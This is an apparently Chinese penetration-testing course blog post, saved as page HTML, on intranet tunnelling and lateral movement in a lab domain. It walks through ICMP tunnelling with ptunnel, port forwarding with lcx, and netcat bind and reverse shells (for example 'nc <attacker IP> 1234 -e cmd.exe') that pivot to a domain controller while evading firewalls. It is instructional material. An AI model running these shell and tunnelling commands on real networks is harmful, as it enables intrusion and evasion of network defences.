@@ -1,0 +1,337 @@
+<!DOCTYPE html><html lang="zh-CN" data-theme="light"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术 | HVVL404</title><meta name="author" content="HVVL404"><meta name="copyright" content="HVVL404"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#ffffff"><meta name="description" content="71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术">
+<meta property="og:type" content="article">
+<meta property="og:title" content="71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术">
+<meta property="og:url" content="http://blog.hvvl404.fun/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/71-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&%E4%BC%A0%E8%BE%93&%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html">
+<meta property="og:site_name" content="HVVL404">
+<meta property="og:description" content="71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://blog.hvvl404.fun/images/avatar.png">
+<meta property="article:published_time" content="2023-05-04T11:21:33.863Z">
+<meta property="article:modified_time" content="2023-05-24T15:23:29.200Z">
+<meta property="article:author" content="HVVL404">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://blog.hvvl404.fun/images/avatar.png"><link rel="shortcut icon" href="/images/hacker.png"><link rel="canonical" href="http://blog.hvvl404.fun/2023/05/04/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/71-%E5%86%85%E7%BD%91%E5%AE%89%E5%85%A8-%E5%9F%9F%E6%A8%AA%E5%90%91%E7%BD%91%E7%BB%9C&amp;%E4%BC%A0%E8%BE%93&amp;%E5%BA%94%E7%94%A8%E5%B1%82%E9%9A%A7%E9%81%93%E6%8A%80%E6%9C%AF/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free/css/all.min.css" media="print" onload="this.media='all'"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>const GLOBAL_CONFIG = {
+  root: '/',
+  algolia: undefined,
+  localSearch: undefined,
+  translate: undefined,
+  noticeOutdate: undefined,
+  highlight: {"plugin":"highlighjs","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false},
+  copy: {
+    success: '复制成功',
+    error: '复制错误',
+    noSupport: '浏览器不支持'
+  },
+  relativeDate: {
+    homepage: false,
+    post: false
+  },
+  runtime: '天',
+  dateSuffix: {
+    just: '刚刚',
+    min: '分钟前',
+    hour: '小时前',
+    day: '天前',
+    month: '个月前'
+  },
+  copyright: undefined,
+  lightbox: 'fancybox',
+  Snackbar: undefined,
+  source: {
+    justifiedGallery: {
+      js: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.js',
+      css: 'https://cdn.jsdelivr.net/npm/flickr-justified-gallery/dist/fjGallery.min.css'
+    }
+  },
+  isPhotoFigcaption: false,
+  islazyload: false,
+  isAnchor: false,
+  percent: {
+    toc: true,
+    rightside: false,
+  },
+  autoDarkmode: false
+}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
+  title: '71-内网安全-域横向网络&传输&应用层隧道技术',
+  isPost: true,
+  isHome: false,
+  isHighlightShrink: false,
+  isToc: false,
+  postUpdate: '2023-05-24 23:23:29'
+}</script><noscript><style type="text/css">
+  #nav {
+    opacity: 1
+  }
+  .justified-gallery img {
+    opacity: 1
+  }
+
+  #recent-posts time,
+  #post-meta time {
+    display: inline !important
+  }
+</style></noscript><script>(win=>{
+    win.saveToLocal = {
+      set: function setWithExpiry(key, value, ttl) {
+        if (ttl === 0) return
+        const now = new Date()
+        const expiryDay = ttl * 86400000
+        const item = {
+          value: value,
+          expiry: now.getTime() + expiryDay,
+        }
+        localStorage.setItem(key, JSON.stringify(item))
+      },
+
+      get: function getWithExpiry(key) {
+        const itemStr = localStorage.getItem(key)
+
+        if (!itemStr) {
+          return undefined
+        }
+        const item = JSON.parse(itemStr)
+        const now = new Date()
+
+        if (now.getTime() > item.expiry) {
+          localStorage.removeItem(key)
+          return undefined
+        }
+        return item.value
+      }
+    }
+  
+    win.getScript = url => new Promise((resolve, reject) => {
+      const script = document.createElement('script')
+      script.src = url
+      script.async = true
+      script.onerror = reject
+      script.onload = script.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        script.onload = script.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(script)
+    })
+  
+    win.getCSS = (url,id = false) => new Promise((resolve, reject) => {
+      const link = document.createElement('link')
+      link.rel = 'stylesheet'
+      link.href = url
+      if (id) link.id = id
+      link.onerror = reject
+      link.onload = link.onreadystatechange = function() {
+        const loadState = this.readyState
+        if (loadState && loadState !== 'loaded' && loadState !== 'complete') return
+        link.onload = link.onreadystatechange = null
+        resolve()
+      }
+      document.head.appendChild(link)
+    })
+  
+      win.activateDarkMode = function () {
+        document.documentElement.setAttribute('data-theme', 'dark')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
+        }
+      }
+      win.activateLightMode = function () {
+        document.documentElement.setAttribute('data-theme', 'light')
+        if (document.querySelector('meta[name="theme-color"]') !== null) {
+          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#ffffff')
+        }
+      }
+      const t = saveToLocal.get('theme')
+    
+          if (t === 'dark') activateDarkMode()
+          else if (t === 'light') activateLightMode()
+        
+      const asideStatus = saveToLocal.get('aside-status')
+      if (asideStatus !== undefined) {
+        if (asideStatus === 'hide') {
+          document.documentElement.classList.add('hide-aside')
+        } else {
+          document.documentElement.classList.remove('hide-aside')
+        }
+      }
+    
+    const detectApple = () => {
+      if(/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)){
+        document.documentElement.classList.add('apple')
+      }
+    }
+    detectApple()
+    })(window)</script><meta name="generator" content="Hexo 6.3.0"><link rel="alternate" href="/atom.xml" title="HVVL404" type="application/atom+xml">
+</head><body><div id="web_bg"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img is-center"><img src="/images/avatar.png" onerror="onerror=null;src='/img/friend_404.gif'" alt="avatar"/></div><div class="sidebar-site-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">50</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">0</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">11</div></a></div><hr/><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url('/images/bg.png')"><nav id="nav"><span id="blog-info"><a href="/" title="HVVL404"><span class="site-name">HVVL404</span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> 主页</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> 站点</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> 标签</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder-open"></i><span> 类别</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-heart"></i><span> 关于</span></a></div></div><div id="toggle-menu"><a class="site-page" href="javascript:void(0);"><i class="fas fa-bars fa-fw"></i></a></div></div></nav><div id="post-info"><h1 class="post-title">71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">发表于</span><time class="post-meta-date-created" datetime="2023-05-04T11:21:33.863Z" title="发表于 2023-05-04 19:21:33">2023-05-04</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">更新于</span><time class="post-meta-date-updated" datetime="2023-05-24T15:23:29.200Z" title="更新于 2023-05-24 23:23:29">2023-05-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89/">小迪安全（内网篇）</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title="71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术"><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">阅读量:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="post-content" id="article-container"><p>71-内网安全-域横向网络&amp;传输&amp;应用层隧道技术 </p>
+<span id="more"></span>
+
+<p>思维导图</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-1.png" alt="71-1"></p>
+<p><strong>必备知识点：</strong></p>
+<p>1.代理和隧道技术区别?</p>
+<ul>
+<li>代理只是为了解决网络通信问题，有些内网访问不到，可以用代理实现</li>
+<li>隧道不仅是解决网络的通信问题，更大的作用是绕过过滤，突破防火墙&#x2F;入侵检测系统。</li>
+</ul>
+<p>2.隧道技术为了解决什么?</p>
+<ul>
+<li>防火墙过滤问题、网络连接通信问题、数据回链封装问题</li>
+<li>在数据通信被拦截的情况下，可以利用隧道技术封装改变通信协议进行绕过拦截。比如CS、MSF无法上线，数据传输不稳定无回显，出口数据被监控，网络通信存在问题等问题，都可以通过隧道技术解决。</li>
+</ul>
+<p>3.隧道技术前期的必备条件？</p>
+<ul>
+<li>在用隧道之前要先探测对应隧道协议是否支持，如果不支持，用这个隧道也没有任何意义！</li>
+</ul>
+<p>隧道原理</p>
+<ul>
+<li>在实际的网络中，通常会通过各种边界设备、软&#x2F;硬件防火墙甚至入侵检测系统来检查对外连接情况，如果发现异样，就会对通信进行阻断。那么什么是隧道呢？这里的隧道，就是一种绕过端口屏蔽的通信方式。防火墙两端的数据包通过防火墙所允许的数据包类型或端口进行封装，然后穿过防火墙，与对方进行通信。当封装的数据包到达目的地时，将数据包还原，并将还原后的数据包发送到相应服务器上。</li>
+</ul>
+<p>常用的隧道技术有以下三种：</p>
+<ul>
+<li>网络层：IPv6 隧道、ICMP 隧道</li>
+<li>传输层：TCP 隧道、UDP 隧道、常规端口转发</li>
+<li>应用层：SSH 隧道、HTTP&#x2F;S 隧道、DNS 隧道</li>
+</ul>
+<p>本课重点：</p>
+<ul>
+<li>案例1：网络传输应用层检测连通性-检测</li>
+<li>案例2：网络层ICMP隧道Ptunnel使用-检测,利用</li>
+<li>案例3：传输层转发隧道Portmap使用-检测,利用</li>
+<li>案例4：传输层转发隧道Netcat使用-检测,利用,功能</li>
+<li>案例5：应用层DNS隧道配合CS上线-检测,利用,说明</li>
+</ul>
+<p><strong>案例1：网络传输应用层检测连通性-检测</strong></p>
+<p>隧道有各种层面的，每个层面又分不同协议，你想要用哪个隧道，就需要先确定目标主机是否支持对应隧道协议。比如你想用一个网络层的 ICMP  隧道，这个时候你要去检测目标主机支不支持ICMP隧道的开启。怎么检测呢？可以使用ping命令去ping地址，看能不能正常通信，如果能的话就可以。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">1.TCP 协议</span><br><span class="line">用“瑞士军刀”——netcat</span><br><span class="line">执行 nc 命令：nc &lt;IP&gt; &lt;端口&gt;</span><br><span class="line"> </span><br><span class="line">2.HTTP 协议</span><br><span class="line">用“curl”工具，执行curl &lt;IP地址:端口&gt;命令。</span><br><span class="line">如果远程主机开启了相应的端口，且内网可连接外网的话，就会输出相应的端口信息</span><br><span class="line"> </span><br><span class="line">3.ICMP 协议</span><br><span class="line">用“ping”命令，执行ping &lt;IP地址/域名&gt;</span><br><span class="line"> </span><br><span class="line">4.DNS 协议</span><br><span class="line">检测DNS连通性常用的命令是“nslookup”和“dig”</span><br><span class="line">nslookup 是windows自带的DNS探测命令</span><br><span class="line">dig是linux系统自带的DNS探测命令</span><br></pre></td></tr></table></figure>
+
+<p><strong>案例2：网络层ICMP隧道ptunnel使用-检测,利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">kali2020-Target2-Target3</span><br><span class="line"> </span><br><span class="line">网上介绍的大部分都是老牌工具，ptunnel工具几年前就没有更新了，不推荐使用。</span><br><span class="line">推荐pingtunnel，这个是一直在升级更新的一个工具。</span><br><span class="line"> </span><br><span class="line">老版本介绍：https://github.com/f1vefour/ptunnel(需自行编译)</span><br><span class="line">新版本介绍：https://github.com/esrrhs/pingtunnel(二次开发版)</span><br><span class="line"> </span><br><span class="line">pingtunnel是把tcp/udp/sock5流量伪装成icmp流量进行转发的工具</span><br><span class="line">为什么要转换？因为tcp、udp、sock5这几个协议受到防火墙和工具的拦截，这个工具就是把这些流量伪装成icmp进行数据传输！</span><br><span class="line"> </span><br><span class="line">语法</span><br><span class="line">-p ##表示连接icmp隧道另一端的机器IP（即目标服务器）</span><br><span class="line">-lp ##表示需要监听的本地tcp端口</span><br><span class="line">-da ##指定需要转发的机器的IP（即目标内网某一机器的内网IP）</span><br><span class="line">-dp ##指定需要转发的机器的端口（即目标内网某一机器的内网端口）</span><br><span class="line">-x ##设置连接的密码</span><br><span class="line"> </span><br><span class="line">命令</span><br><span class="line">Webserver：./ptunnel -x xiaodi</span><br><span class="line">Hacker xiaodi：./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi #转发的3389请求数据给本地1080</span><br><span class="line">Hacker xiaodi：rdesktop 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p>环境准备</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-2.png" alt="71-1"></p>
+<p>我们要通过web主机实现对DC的控制，但是DC上面有防护的一些策略，此时可以尝试使用隧道协议。</p>
+<p>下面要实现用hacker xiaodi去连接DC，假设前期已知DC的账号密码，攻击者希望通过自己的计算机hacker  xiaodi连接到DC的3389，现在76.x是不可能去连接到33.33这台计算机的（可以在kali输入命令：rdesktop  192.168.33.33，连接不上），因为他们不在一个网段。</p>
+<p>现在我要实现请求连接DC的3389端口：先通过hackerxiaodi连接webserver的外网接口192.168.76.150，然后借助33网卡连接DC的33.33。</p>
+<p>案例演示</p>
+<p>&lt;1&gt;用“ping”命令检测连通性，正常通信，说明支持 ICMP 协议，可以使用 ICMP 隧道。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-3.png" alt="71-1"></p>
+<p>&lt;2&gt;在webserver上开启隧道，设置密码为xiaodi。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Webserver：./ptunnel -x xiaodi</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-4.png" alt="71-1"></p>
+<p>&lt;3&gt;在kali上执行以下命令，将webserver作为跳板，转发目标主机3389请求数据给本地1080端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hacker xiaodi：./ptunnel -p 192.168.76.150 -lp 1080 -da 192.168.33.33 -dp 3389 -x xiaodi</span><br></pre></td></tr></table></figure>
+
+<p>上面命令的意思是请求192.168.76.150（webserver），请求到之后，自己监听一下本地的1080，然后将33.33的3389数据，给到本地的1080。然后下一步就直接利用rdesktop连接本地的1080，实质就是连接33.33。</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-5.png" alt="71-1"></p>
+<p>&lt;4&gt;在kali上执行以下命令，弹出远程桌面</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Hacker xiaodi：rdesktop 127.0.0.1 1080</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-6.png" alt="71-1"></p>
+<p>这样做有什么意义呢？原来3389连接远程桌面，使用的是3389对应的协议，现在连接远程桌面，流量数据传输就变成使用 ICMP 协议了。</p>
+<p><strong>案例3：传输层转发隧道Portmap使用-检测,利用</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">隧道技术：传输层端口转发</span><br><span class="line"> </span><br><span class="line">工具：</span><br><span class="line">windows: lcx</span><br><span class="line">linux：portmap</span><br><span class="line"> </span><br><span class="line">lcx是一个端口转发工具，通过端口转发的形式，将内网服务器的某一个端口映射到公网另一台服务器的一个端口上去！</span><br><span class="line">下载：https://github.com/MrAnonymous-1/lcx</span><br><span class="line"> </span><br><span class="line">命令：</span><br><span class="line">DC(3.21)：lcx -slave &lt;攻击 IP&gt; 3131 127.0.0.1 3389 //将本地3389给攻击IP的3131</span><br><span class="line">webserver(3.31)：lcx -listen 3131 3333 //监听3131转发至3333</span><br><span class="line">kali：rdesktop 192.168.76.143:7777</span><br></pre></td></tr></table></figure>
+
+<p>环境准备</p>
+<ul>
+<li>受害者内网的主机（无法出网，但是能和内网的主机进行交互）：192.168.3.21（内网ip）</li>
+<li>受害者内网的主机（跳板，能出网）：拥有2个IP地址：192.168.3.31（内网ip）和192.168.76.143（外网ip）</li>
+<li>攻击者的外网服务器：192.168.76.X</li>
+</ul>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-7.png" alt="71-1"></p>
+<p>案例演示</p>
+<p>&lt;1&gt;在DC上执行以下命令，将本地3389给webserver的6666。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DC(3.21)：lcx -slave 192.168.3.31 6666 127.0.0.1 3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-8.png" alt="71-1"></p>
+<p>&lt;2&gt;在webserver上执行以下命令，监听6666端口流量并转发至7777</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webserver(3.31)：lcx -listen 6666 7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-9.png" alt="71-1"></p>
+<p>&lt;3&gt;在webserver上执行以下命令，连接webserver的7777，登录远程桌面访问，这里其实登录的是域控DC的远程桌面。</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">rdesktop 192.168.76.143:7777</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-10.png" alt="71-1"></p>
+<p>登录成功</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-11.png" alt="71-1"></p>
+<p><strong>案例4：传输层转发隧道Netcat使用-检测,利用,功能</strong></p>
+<p>netcat工具是windows和linux都能利用，但是用的时候一定要确保nc是最新版，linux是自带这个命令，老版本有的不支持-e这个选项，很多功能会有限制。</p>
+<p>netcat称为瑞士军刀的原因就是它利用起来非常方便，反弹会话是有很多方式的，可以利用多种协议去实现控制，因为我们在实战过程中会有很多协议被封住被拦截，所以我们要掌握很多种控制的协议，实战中就不会掉链子！</p>
+<p>netcat使用的是TCP协议，所以如果受害主机没有过滤TCP协议，我们就可以尝试使用nc命令在传输层建立隧道连接实现与控制主机的通信。</p>
+<p>nc命令复习：</p>
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-12.png" alt="71-1"></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line">环境准备：Kali2020-god\webserver-god\sqlserver|dc</span><br><span class="line"> </span><br><span class="line">1.双向连接反弹shell</span><br><span class="line">环境：攻击主机webserver（3.31）--&gt;受害主机DC（3.21）</span><br><span class="line"> </span><br><span class="line">正向-攻击连接受害</span><br><span class="line">受害：nc -ldp 1234 -e /bin/sh                      //linux（把shell会话反弹给1234端口）</span><br><span class="line">      nc -ldp 1234 -e c:\windows\system32\cmd.exe  //windows（把cmd反弹给1234端口）</span><br><span class="line">攻击：nc 受害主机IP 1234                           //主动连接</span><br><span class="line"> </span><br><span class="line">反向-受害连接攻击</span><br><span class="line">攻击：nc -lvp 1234                         //攻击主机监听自己的1234</span><br><span class="line">受害：nc 攻击主机IP 1234 -e /bin/sh</span><br><span class="line">      nc 攻击主机IP 1234 -e c:\windows\system32\cmd.exe</span><br><span class="line"> </span><br><span class="line">什么时候用正向，什么时候用反向？</span><br><span class="line">这是根据网络情况，如果受害主机可以找到你，就用反向，受害主机找不到你，就用正向。</span><br><span class="line"> </span><br><span class="line">2.多向连接反弹shell-配合转发</span><br><span class="line">环境：kali（76.132）--&gt;webserver（3.31、76.143）--&gt;sqlserver（3.32）</span><br><span class="line"> </span><br><span class="line">反向：</span><br><span class="line">god\Webserver：lcx.exe -listen 2222 3333 //把自己的2222端口给3333</span><br><span class="line">god\Sqlserver：nc 192.168.3.31 2222 -e c:\windows\system32\cmd.exe //把cmd反弹给webserver的2222端口</span><br><span class="line">kali或本机：nc -v 192.168.76.143 3333 //连接Webserver的3333端口（获取Sqlserver的cmd窗口数据）</span><br><span class="line"> </span><br><span class="line">思考：正向该怎么操作呢？实战中该怎么选择正向和反向？</span><br><span class="line"> </span><br><span class="line">3.相关netcat主要功能测试</span><br><span class="line">指纹服务：nc -nv 192.168.76.143</span><br><span class="line">端口扫描：nc -v -z 192.168.76.143 1-100</span><br><span class="line">端口监听：nc -lvp xxxx</span><br><span class="line">文件传输：nc -lp 1111 &gt;1.txt | nc -vn xx.xx.x.x 1111 &lt;1.txt -q 1</span><br><span class="line">反弹Shell：见上</span><br></pre></td></tr></table></figure>
+
+<p>案例演示1-正向（攻击连接受害）</p>
+<p>&lt;1&gt;在受害主机DC上执行以下命令，将自身的cmd窗口反弹给1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">DC上：nc -ldp 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-13.png" alt="71-1"></p>
+<p>&lt;2&gt;在攻击主机webserver上执行以下命令，主动连接，成功反弹shell</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webserver上：nc 192.168.3.21 1234</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-14.png" alt="71-1"></p>
+<p>案例演示2-反向（受害连接攻击）</p>
+<p>&lt;1&gt;在攻击主机webserver上执行以下命令，监听1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">webserver：nc -lvp 1234</span><br></pre></td></tr></table></figure>
+
+<p>&lt;2&gt;在受害主机DC上执行以下命令，将自身的命令窗口给到webserver的1234端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc 192.168.3.31 1234 -e c:\windows\system32\cmd.exe</span><br></pre></td></tr></table></figure>
+
+<p><img src="/%5Cimages%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%5C%E5%B0%8F%E8%BF%AA%E5%AE%89%E5%85%A8%EF%BC%88%E5%86%85%E7%BD%91%E7%AF%87%EF%BC%89%5C71-15.png" alt="71-1"></p>
+<p>&lt;3&gt;在攻击主机webserver上，成功反弹shell</p>
